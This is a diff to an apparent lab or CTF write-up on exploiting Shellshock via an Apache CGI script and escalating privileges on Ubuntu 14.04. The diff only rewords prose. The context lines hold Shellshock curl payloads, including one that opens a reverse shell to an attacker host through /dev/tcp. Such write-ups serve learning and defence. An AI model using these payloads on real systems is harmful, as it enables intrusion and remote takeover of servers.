@@ -106,7 +106,7 @@ This can be exploited by an attacker in systems that store user input in environ
 
 - Some Apache servers uses `Common Gateway  Interface`[CGI] which allows cli programs to be used to generate dynamic pages.Request information e.g. query parameters, user agent, etc. is stored in environment variables. Standard output from the program is returned to the user as the HTTP response.
 
-- I tested the cgi script by trying to echo `vulnerable`. It worked
+- I tested the cgi script by attempting to echo `vulnerable` which reflected the output `vulnerable`.
 
  Payload-:```curl -H "User-agent: () { :;}; echo; echo vulnerable"  [path]```
 
@@ -123,7 +123,7 @@ Payload-:```curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/<ip>/<por
 
 ### PRIVESC with DirtyCow exploit
 
-- I ran `hostnamectl` to check for the operating system version and discovered it is `UBUNTU 14.04` which is vulnerable to the `overlayfs` exploit.
+- I ran `hostnamectl` to check for the operating system version that turned out to be `UBUNTU 14.04` which is vulnerable to the `overlayfs` exploit.
 
 ![image](https://github.com/user-attachments/assets/9ab23dbd-b756-4e9f-ae91-76510b2bdeae)
 
